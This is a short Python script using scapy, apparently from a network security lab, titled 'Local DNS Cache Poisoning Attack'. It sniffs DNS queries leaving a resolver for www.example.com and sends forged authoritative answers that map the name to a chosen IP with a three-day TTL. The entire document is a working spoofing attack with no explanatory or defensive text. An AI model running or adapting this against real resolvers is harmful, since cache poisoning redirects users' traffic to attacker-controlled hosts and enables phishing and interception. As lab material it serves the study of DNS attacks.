#!/usr/bin/env python3
from scapy.all import *

website = 'www.example.com' 
spoofed_IP = '1.2.3.5'
my_iface ='br-063253a970dc'
port_num = 53
target = '10.9.0.53'
my_filter = 'udp and src host {A} and dst port 53'.format(A=target)

print("Local DNS Cache Poisoning Attack")

def spoof_dns(pkt):
  if (DNS in pkt and website in pkt[DNS].qd.qname.decode('utf-8')):

    print("Sniffing & Spoofing ...")
    
    old_ip = pkt[IP]
    old_udp = pkt[UDP]
    old_dns = pkt[DNS]
    
    IPpkt = IP(dst=old_ip.src, src=old_ip.dst)
    UDPpkt = UDP(dport=old_udp.sport, sport=port_num)

    # The Answer Section
    Anssec = DNSRR(rrname=old_dns.qd.qname, type='A', ttl=259200, rdata=spoofed_IP)

    # Construct the DNS packet
    DNSpkt = DNS(id=old_dns.id, qd=old_dns.qd, aa=1, qr=1,  
                 qdcount=1, ancount=1, an=Anssec)

    # Construct the entire IP packet and send it out
    spoofpkt = IPpkt/UDPpkt/DNSpkt
    send(spoofpkt)

pkt = sniff(iface=my_iface, filter=my_filter, prn=spoof_dns)      
